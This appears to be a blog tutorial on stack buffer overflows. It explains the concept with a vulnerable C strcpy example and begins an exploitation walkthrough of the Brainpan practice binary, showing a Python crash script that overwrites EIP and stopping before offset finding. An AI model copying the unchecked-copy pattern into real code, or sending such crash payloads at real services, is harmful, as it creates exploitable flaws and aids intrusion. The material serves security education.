## Stack Overflows

## What is a Stack Buffer Overflow?

A stack buffer overflow is a type of vulnerability that occurs when a program writes more data to a buffer on the stack than it was originally allocated to hold. Buffers are blocks of memory, typically arrays or character strings, that store temporary data. When a program doesn’t check the amount of data written to a buffer, it can overwrite other parts of the stack, which can cause unintended behavior, crashes, or security vulnerabilities.

In short, a stack buffer overflow happens when the data you’re writing exceeds the buffer’s allocated memory and begins to overwrite adjacent memory, potentially including the return address and local variables stored on the stack.

### Example of a Stack Buffer Overflow

Consider this C code:

```c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *str) {
    char buffer[10];  // Allocate a small buffer of 10 bytes
    strcpy(buffer, str);  // Copy input into buffer without checking size
}

int main() {
    char *long_string = "This string is too long for the buffer!";
    vulnerable_function(long_string);
    return 0;
}
```

#### In this example:

1. The function vulnerable_function creates a buffer on the stack that can hold only 10 bytes.
2. The strcpy function copies the contents of long_string into buffer.
3. Since long_string is longer than 10 bytes, strcpy writes beyond the boundaries of buffer, causing a stack buffer overflow.

### Why Is a Stack Buffer Overflow Dangerous?

When the data overflows past the buffer, it overwrites nearby memory on the stack, which can include:

- Return addresses: Changing the return address can redirect the program’s execution flow, often to code provided by an attacker.
- Local variables and control structures: This can change the behavior of the function, possibly causing unexpected actions or program crashes.

### Exploiting a Stack Buffer Overflow

Attackers can exploit stack buffer overflows to inject and execute malicious code. Let’s break down how:

1. Controlling the Return Address: By carefully crafting the overflow data, an attacker can overwrite the return address with the memory address of their own malicious code.
2. Injecting Malicious Code: The attacker can place malicious code (often called shellcode) in memory, usually within the overflowed buffer.
3. Redirecting Execution: When the function returns, instead of returning to the caller, it jumps to the attacker’s code, effectively granting control over the program.

## Example of Exploitation

In this section we are going to exploit a binary called "Brainpan". You can download it here --> [brainpan.exe](/assets/binaries/brainpan.exe).

We have the following exploit template:

### Initial Crash

```py
import struct
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999
target = (TARGET_IP, TARGET_PORT) 

CRASH_LEN = 5000  # change me

payload = b"A" * CRASH_LEN

with socket.create_connection(target) as sock:
    sock.recv(512) 

    sent = sock.send(payload)
    print(f"sent {sent} bytes")

```

We start clicking at the binary to execute it.

![](/assets/img/more_images/2024-10-25-1.png)

Don't forget to attach the debugger to it, in this case I will use "WinDbg". Attach it and send the payload.

![](/assets/img/more_images/2024-10-25-2.png)

We see that the "eip" is overwritten. We need to find an offset to overwrite the "eip" with our desired value.



